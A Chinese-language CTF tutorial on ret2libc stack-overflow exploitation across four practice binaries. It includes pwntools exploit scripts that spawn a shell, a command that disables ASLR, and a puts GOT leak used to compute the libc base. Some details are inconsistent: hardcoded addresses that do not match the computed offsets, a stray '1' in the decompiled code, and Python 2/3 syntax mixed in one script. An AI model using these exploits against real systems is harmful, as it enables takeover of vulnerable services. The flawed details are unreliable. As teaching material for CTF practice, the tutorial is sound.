# 基本ROP-ret2libc

> 参考：[ret2syscall-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/crpf61#h2-7) 
>



**原理**

共享库libc.so中存在system()以及execve()，找到/bin/sh字符串，覆盖掉返回地址即可获得当前进程的控制权



## 示例1

**源码**

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 256);
}
int main(int argc, char** argv) {
	vulnerable_function();
	write(STDOUT_FILENO, "Hello, World\n", 13);
}
```



**关闭ASLR**

```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```



**编译**

```shell
gcc ret2lib.c -fno-stack-protector -no-pie -m32 -o ret2lib
```



**查看共享模块**

```shell
$ ldd ret2lib
        linux-gate.so.1 (0xf7f9c000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d8f000)
        /lib/ld-linux.so.2 (0xf7f9e000)
```



**寻找system()函数**

找到的地址要加上基地址（ldd命令查到的libc.so.6基地址）

```shell
$ objdump -T /lib32/libc.so.6 | grep system
001379b0 g    DF .text  00000066 (GLIBC_2.0)  svcerr_systemerr
00044cc0 g    DF .text  00000037  GLIBC_PRIVATE __libc_system
00044cc0  w   DF .text  00000037  GLIBC_2.0   system
```



**寻找/bin/sh字符串**

找到的地址要加上基地址（ldd命令查到的libc.so.6基地址）

```shell
$ ROPgadget --binary /lib32/libc.so.6 --string '/bin/sh'
Strings information
============================================================
0x0018fb62 : /bin/sh
```



**手动测量溢出长度**

`cyclic 200`生成200长度无序字符串，传入栈中判断溢出，先使用**peda-gdb**打开ret2lib

```shell
$ gdb ret2lib	# 打开ret2lib
gdb-peda$ start	# 开始调试，中断在main函数
gdb-peda$ c		# 按c继续执行，接着将200位字符串输入
Invalid $PC address: 0x6261616b	# 得到溢出字符，每两位数字转换为10进制，再对应ASCII得到字符为baad
$ cyclic -l 0x6261616b	# 得到溢出字符前面位数140
```



**EXP**

```python
from pwn import *
#context.log_level = 'debug'
debug = 1
if debug:
	sh = process('./ret2lib')
system_addr = 0xf7e08870
binsh_addr  = 0xf7f47968
payload = flat(['a' * 140,system_addr,0xdeadbeef,binsh_addr])

def pwn(sh, payload):
	sh.sendline(payload)
	sh.interactive()
pwn(sh, payload)
```



保存为`exp.py`，使用Python3执行，成功getshell

```shell
# python 1.py                  
[+] Starting local process './ret2lib': pid 4351
/home/kali/Desktop/1.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat(
[*] Switching to interactive mode
$ ls
1.py  peda-session-rop.txt  ret2lib

```



## 示例2

> 参考：[ret2libc实战1-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/aikosg)
>
> 下载：[ret2libc1](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1)



checksec发现是32位，开启NX保护

扔进IDA发现容易栈溢出的gets函数，以及含有system()的secure()函数

测算栈长度112



**查找字符串/bin/sh**

```shell
$ ROPgadget --binary ret2libc1 --string '/bin/sh' 
Strings information
============================================================
0x08048720 : /bin/sh
```



IDA查看system()地址



**EXP**

正常调用system函数有一个对应的返回地址，这里以虚假地址bbbb提交，后面参数对应参数内容

```shell
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```



成功getshell



## 示例3

检查文件保护，发现是32位程序，开启了NX

拖进IDA发现危险栈溢出函数gets，同时在secure函数中发现system函数

没找到/bin/sh，但是在bss段找到一些可以利用的空间，可以在这个空间中写入/bin/sh

使用cyclic测出栈偏移为112

首先使用112个A字符填充栈，使栈发生栈溢出，再用gets函数的plt地址来覆盖原返回地址，使程序流执行到gets函数，参数就是bss段的地址，目的是让gets函数将/bin/sh写入bss段中，接下来使用system函数覆盖gets函数的返回地址，使程序执行到system函数，参数是bss段中的内容

**EXP**

```python
from pwn import *
bss_addr = 0x0804A080
gets_plt = 0x08048460
sys_plt  = 0x08048490

io=process('./ret2libc2')
io.recvuntil('What do you think ?')
payload = flat(['A'*112,gets_plt,sys_plt,bss_addr,bss_addr])
io.sendline(payload)
io.sendline('/bin/sh')
io.interactive()
```



# 示例4

> [原文地址](https://www.yuque.com/cyberangel/rg9gdm/yklqa0) | [文件下载](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3)

---

用checksec检查文件保护，发现是32位程序，只开启了栈上不可执行（NX）

```bash
$ checksec --file=ret2libc3
[*] '/home/kali/Desktop/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



扔到IDA中进行反编译，并未发现system函数和/bin/sh字符串

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets(s);
  return 0;1
}
```



在Kali Linux中用gdb-peda下断点配合Cyclic计算栈偏移为112

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ gdb ret2libc3
Reading symbols from ret2libc3...

gdb-peda$ r
Starting program: /home/kali/Desktop/ret2libc3 
No surprise anymore, system disappeard QQ.
Can you find it !?

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xf7fa7580 --> 0xfbad2288 
EDX: 0xfbad2288 
ESI: 0x1 
EDI: 0x80484d0 (<_start>:       xor    ebp,ebp)
EBP: 0x62616163 ('caab')
ESP: 0xffffd140 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164
[------------------------------------stack-------------------------------------]
0028| 0xffffd15c ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]


gdb-peda$ quit
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ cyclic -l 0x62616164
112
```



重要的几点：

- system函数属于libc，而libc.so动态链接库中的函数之间先后对唯一是固定的
- 即使开启了ASLR，只是针对地址中间位进行随机，最低的12位并不会发生变化
- 所以只要得到libc版本就可以知道system函数和/bin/sh的偏移量，再找到libc的基地址

> libc基地址 + 函数偏移量 = 函数真实地址



我们可以通过泄露一个函数的真实地址，然后得到libc的基zuowei地址；而泄露函数真实地址又用到了libc的延迟绑定技术：

- 第一次调用函数时，函数的got表存放下一条plt表的指令的地址，然后得到函数真实地址后，放到了函数的got表里
- 第二次调用函数时，got表里存放的就是函数的真实地址了
- 我们得到真实地址后，作为参数传入函数，就会把函数的真实地址输出出来



脚本如下：

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象
puts_plt_addr = elf.plt['puts']#puts的plt表的地址，我们需要利用puts函数泄露
main_plt_addr = elf.symbols['_start']#返回地址被覆盖为main函数的地址。使程序还可被溢出

print ("puts_got_addr = ",hex(puts_got_addr))
print ("puts_plt_addr = ",hex(puts_plt_addr))
print ("main_plt_addr = ",hex(main_plt_addr))


payload=flat(['A'*112,puts_plt_addr,main_plt_addr,puts_got_addr])

p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4]) #输出后用p32解包
print ("puts_addr = ",hex(puts_addr))
```



得到函数的真实地址，通过查询网站https://libc.blukat.me/得到使用的libc版本，也可以使用

https://github.com/niklasb/libc-database



找到本机的libc所在的文件目录

```shell
$ sudo find / -name libc.so.6
/usr/lib/x86_64-linux-gnu/libc.so.6	#应该是编译elf文件时用到的
/usr/lib32/libc.so.6	# 应该是运行elf加载文件时用到的
```



找到这个文件，直接带不出来，通过压缩带出来查看十六进制



使用项目

```shell
$ git clone https://github.com/niklasb/libc-database.git

$ ./get   #安装或更新你的libc数据库

$ ./add /usr/lib/libc-2.21.so   #添加本地的libc文件到数据库

$ ./find printf 260 puts f30    #查找符合要求的libc数据库文件
archive-glibc (id libc6_2.19-10ubuntu2_i386)

$ ./find __libc_start_main_ret a83
ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)
archive-eglibc (id libc6_2.19-0ubuntu6_i386)
ubuntu-utopic-i386-libc6 (id libc6_2.19-10ubuntu2.3_i386)
archive-glibc (id libc6_2.19-10ubuntu2_i386)
archive-glibc (id libc6_2.19-15ubuntu2_i386)

$ ./dump libc6_2.19-0ubuntu6.6_i386     #dumplibc文件的部分数据偏移信息
offset___libc_start_main_ret = 0x19a83
offset_system = 0x00040190
offset_dup2 = 0x000db590
offset_recv = 0x000ed2d0
offset_str_bin_sh = 0x160a24

$ ./identify /usr/lib/libc.so.6
id local-f706181f06104ef6c7008c066290ea47aa4a82c5

$ ./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
    -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
    -> Downloading package
    -> Extracting package
    -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
$ ls libs/libc6_2.23-0ubuntu10_amd64
ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...
```



上面是使用方法

```shell
$ ./add /usr/lib32/libc-2.28.so  #添加本地的libc文件
->wrting libc to db/local-a819.so
->wrting symbols to db/local-a819.symbols

$ ./dump local-a819		# 查看libc文件的部分信息
offset_libc_start_main_ret = 0x1ab41
```



然后整理下思路：

- 泄露puts函数的真实地址
- 得到libc的版本
- 得到system和puts和sh的偏移，计算出libc基地址
- 计算出system和sh的真实地址
- 构造payload为system('/bin/sh')
- 写exp

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

print "puts_got_addr = ",hex(puts_got_addr)
print "puts_plt_addr = ",hex(puts_plt_addr)
print "main_plt_addr = ",hex(main_plt_addr)

payload = ''
payload += 'A'*112
payload += p32(puts_plt_addr)
payload += p32(main_plt_addr)
payload += p32(puts_got_addr)

p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])
print ("puts_addr = ",hex(puts_addr))
sys_offset = 0x0003e980
puts_offset = 0x00068FD0
sh_offset = 0x00017eaaa

libc_base_addr = puts_addr - puts_offset 
sys_addr = libc_base_addr + sys_offset
sh_addr = libc_base_addr + sh_offset 

print ("libc_base_addr = ",hex(libc_base_addr))
print ("sys_addr = ",hex(sys_addr))
print ("sh_addr = ",hex(sh_addr))

payload =flat(['A'*112,sys_addr,"AAAA",sh_addr])


p.sendline(payload)
p.interactive()
```
